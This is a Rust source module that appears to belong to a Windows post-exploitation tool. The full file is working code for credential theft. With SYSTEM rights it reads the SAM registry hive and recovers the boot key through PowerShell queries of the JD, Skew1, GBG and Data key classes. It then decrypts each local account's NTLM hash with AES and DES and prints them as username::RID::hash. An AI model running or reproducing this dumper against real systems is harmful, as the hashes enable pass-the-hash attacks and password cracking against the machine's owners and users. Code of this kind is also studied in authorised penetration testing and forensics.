extern crate des;

use crate::utilities::Utils;

use des::decrypt;

pub mod powershell_command;

use winreg::enums::*;
use winreg::RegKey;

use regex::Regex;

use anyhow::{
    anyhow, 
    Result
};

use std::process::Command;
use std::fmt::Write;

use aes::Aes128;

use block_modes::{
    BlockMode, 
    Cbc
};

use block_modes::block_padding::NoPadding;

type Aes128Cbc = Cbc<Aes128, NoPadding>;

pub struct Ntlm {
    username: String,
    rid: usize,
    hash: String
}

impl Ntlm {
    pub fn grab() -> Result<()> {
        if !Utils::is_elevated() {
            println!("[-] Program requires atleast system permissions");
        } else {
            if Utils::is_system() {
                if let Ok(ntlms) = get_ntlm_hash() {
                    for ntlm in ntlms {
                        println!("{}::{}::{}", ntlm.username, ntlm.rid, ntlm.hash);
                    }
                }
            }
        }
        Ok(())
    }
}

fn get_bootkey(input: String) -> Result<Vec<u8>> {
    let mut bootkey = vec![];

    let class: Vec<char> = input.chars().collect();
    let modulo_numbers = vec![8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7];
    for number in modulo_numbers {
        let number_first = class[number * 2];
        let number_second = class[number * 2 + 1];

        bootkey.push(u8::from_str_radix(format!("{}{}", number_first, number_second).as_str(), 16)?);
    }
    Ok(bootkey)
}

fn get_deskey_key(input: String, modulos: Vec<usize>) -> Result<Vec<u8>> {
    let mut deskey = vec![];

    let class: Vec<char> = input.chars().collect();
    for number in modulos {
        let number_first = class[number * 2];
        let number_second = class[number * 2 + 1];

        deskey.push(u8::from_str_radix(format!("{}{}", number_first, number_second).as_str(), 16)?);
    }
    Ok(deskey)
}

fn get_i32_from_vector(buf: &[u8]) -> i32 {

    let mut buffer = [0u8; 4];
    let mut counter = 0;

    for i in buf.iter() {
        buffer[counter] = *i;
        counter += 1;
    }


    return unsafe{ std::mem::transmute::<[u8; 4], i32>(buffer) };
}

fn vector_str_to_vector_u8(input: Vec<String>) -> Vec<u8> {
    let mut output = vec![];

    for i in input {
        match i.parse::<u8>() {
            Ok(byte) => output.push(byte),
            Err(_) => continue,
        };
    }

    output
}

fn convert_string(input: &[u8]) -> String {
    let mut s = String::with_capacity(2 * input.len());
    for byte in input {
        write!(s, "{:02X}", byte).unwrap();
    }
    s
}

fn get_users() -> Result<Vec<String>> {
    let mut users_vector: Vec<String> = vec![];
    for i in RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SAM\\SAM\\Domains\\Account\\Users")?.enum_keys().map(|x| x.unwrap()) {
        let re = Regex::new(r"^[0-9A-F]{8}$")?;
        if re.is_match(&i) {
            users_vector.push(i);
        }
    }
    Ok(users_vector)
}

fn collect_f_bytes() -> Result<Vec<u8>> {
    let system = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SAM\\SAM\\Domains\\Account")?;
    for (name, value) in system.enum_values().map(|x| x.unwrap()) {
        if name == "F" {
            return Ok(extract_binary_data(value.to_string()));
        }
    }
    return Err(anyhow!("Failed to collect f bytes"));
}

fn collect_v_bytes(user: String) -> Result<Vec<u8>> {
    let location = format!("SAM\\SAM\\Domains\\Account\\Users\\{}", user);
    let system = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(location)?;
    for (name, value) in system.enum_values().map(|x| x.unwrap()) {
        if name == "V" {
            return Ok(extract_binary_data(value.to_string()));
        }
    }
    return Err(anyhow!("Failed to collect v bytes"));
}

fn extract_binary_data(input: String) -> Vec<u8> {

    let first_replace = format!("{:?}", input).replace("F = RegValue(REG_BINARY: [", "");
    let second_replace = format!("{:?}", first_replace).replace("])", "").replace("RegValue(REG_BINARY: [", "").replace(" ", "").replace('"', "").replace("\\[", "").replace("]\\", "");
    let bytes: Vec<String> = second_replace.split(",").map(String::from).collect();

    return vector_str_to_vector_u8(bytes);
}

fn get_class_registry() -> String {
    let keys = vec!["JD", "Skew1", "GBG", "Data"];

    let mut total = String::new();

    for keyname in keys {
        let argument = format!("{}{}", powershell_command::get_imports(), powershell_command::get_keyclass(keyname));
        let mut command = Command::new("powershell");
        let output = format!("{:?}", command.arg(argument).output());

        let split1: Vec<&str> = output.split(r#"stdout: ""#).collect();
        let split2: Vec<&str> = split1[1].split(r#"\r\n""#).collect();
        let output = split2[0];

        total.push_str(output);
    }

    return total;
}

fn to_rid(input: String) -> usize {
    if let Ok(result) = usize::from_str_radix(&input, 16) {
        return result;
    }
    return 0;
}

fn transform_to_struct(username: String, rid: usize, hash: String) -> Ntlm {
    Ntlm {
        username: username,
        rid: rid,
        hash: hash,
    }
}

fn unicode_to_string(input: &[u8]) -> String {
    match std::str::from_utf8(&input) {
        Ok(string) => return string.replace("\u{0}", "").to_string(),
        Err(_) => return format!("Failed to decode string"),
    };
}

fn aes_128_cbc_decrypt(key: &[u8], iv: &[u8], input: Vec<u8>) -> Result<Vec<u8>> {
    let cipher = Aes128Cbc::new_from_slices(&key, &iv)?;
    let mut buf = input;
    return Ok(cipher.decrypt(&mut buf)?.to_vec());
}

// 000001F4
// 000001F5
// 000001F7
// 000001F8
// 000003E8
// 000003E9


fn str_to_key(input: Vec<u8>) -> [u8; 8] {
    let mut encoded_key = vec![];
    let mut key = [0u8; 8];  

    let odd_parity = vec![
    1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
    16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
    32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
    49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
    64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
    81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
    97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
    112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
    128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
    145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
    161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
    176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
    193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
    208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
    224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
    241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254];

    encoded_key.push(bitshift(input[0].into(), -1) as u8);
    encoded_key.push(bitshift((input[0] & 1).into(), 6) as u8 | bitshift(input[1].into(), -2) as u8);
    encoded_key.push(bitshift((input[1] & 3).into(), 5) as u8 | bitshift(input[2].into(), -3) as u8);
    encoded_key.push(bitshift((input[2] & 7).into(), 4) as u8 | bitshift(input[3].into(), -4) as u8);
    encoded_key.push(bitshift((input[3] & 15).into(), 3) as u8 | bitshift(input[4].into(), -5) as u8);
    encoded_key.push(bitshift((input[4] & 31).into(), 2) as u8 | bitshift(input[5].into(), -6) as u8);
    encoded_key.push(bitshift((input[5] & 63).into(), 1) as u8 | bitshift(input[6].into(), -7) as u8);
    encoded_key.push(input[6] & 127);
    key[0] = odd_parity[(bitshift(encoded_key[0].into(), 1)) as usize];
    key[1] = odd_parity[(bitshift(encoded_key[1].into(), 1)) as usize];
    key[2] = odd_parity[(bitshift(encoded_key[2].into(), 1)) as usize];
    key[3] = odd_parity[(bitshift(encoded_key[3].into(), 1)) as usize];
    key[4] = odd_parity[(bitshift(encoded_key[4].into(), 1)) as usize];
    key[5] = odd_parity[(bitshift(encoded_key[5].into(), 1)) as usize];
    key[6] = odd_parity[(bitshift(encoded_key[6].into(), 1)) as usize];
    key[7] = odd_parity[(bitshift(encoded_key[7].into(), 1)) as usize];
    key
}

fn bitshift(input: f64, power: i32) -> f64 {
    return (input * 2_f64.powi(power)).floor();
}

fn get_ntlm_hash() -> Result<Vec<Ntlm>> {

    let mut hashes: Vec<Ntlm> = vec![];

    if let Ok(users) = get_users() {
        for user in users {
            if let Ok(v) = collect_v_bytes(user.clone()) {
                if let Ok(f) = collect_f_bytes() {
                    let class = get_class_registry();

                    let offset = get_i32_from_vector(&v[12..16]) + 204;
                    let len = get_i32_from_vector(&v[16..20]);

                    let username = unicode_to_string(&v[offset as usize..(offset + len) as usize]);

                    let offset = get_i32_from_vector(&v[168..172]) + 204;
                    let bootkey = get_bootkey(class)?;
                    
                    let enc_ntlm = match v[172] {
                        56 => {
                            let encrypted_syskey = &f[136..152];
                            let encrypted_syskey_iv = &f[120..136];
                            let encrypted_syskey_key = bootkey;

                            let syskey = aes_128_cbc_decrypt(&encrypted_syskey_key, &encrypted_syskey_iv, encrypted_syskey.to_vec());

                            let enc_ntlm = &v[offset as usize + 24..offset as usize + 24 + 16];
                            let enc_ntlm_iv = &v[offset as usize + 8..offset as usize + 24];
                            let enc_ntlm_key = syskey?;

                            let enc_ntlm = aes_128_cbc_decrypt(&enc_ntlm_key, &enc_ntlm_iv, enc_ntlm.to_vec());
                            enc_ntlm
                        },
                        20 => {
                            continue;
                        },
                        _ => {
                            Ok(vec![])
                        },
                    };

                    if let Ok(enc_ntlm) = enc_ntlm {
                        if !enc_ntlm.is_empty() {

                            let des_str_one = get_deskey_key(user.clone(), vec![3,2,1,0,3,2,1])?;
                            let des_str_two = get_deskey_key(user.clone(), vec![0,3,2,1,0,3,2])?;

                            let des_key_one = str_to_key(des_str_one);
                            let des_key_two = str_to_key(des_str_two);

                            let ntlm1 = decrypt(&enc_ntlm, &des_key_one);
                            let ntlm2 = decrypt(&enc_ntlm, &des_key_two);

                            hashes.push(transform_to_struct(username.to_string(), to_rid(user.clone()), format!("{}{}",convert_string(&ntlm1[..8]), convert_string(&ntlm2[8..]))));
                        } else {
                            hashes.push(transform_to_struct(username.to_string(), to_rid(user.clone()), "31D6CFE0D16AE931B73C59D7E0C089C0".to_string()));
                        }
                    }
                }
            }
        }
    }


    Ok(hashes)
}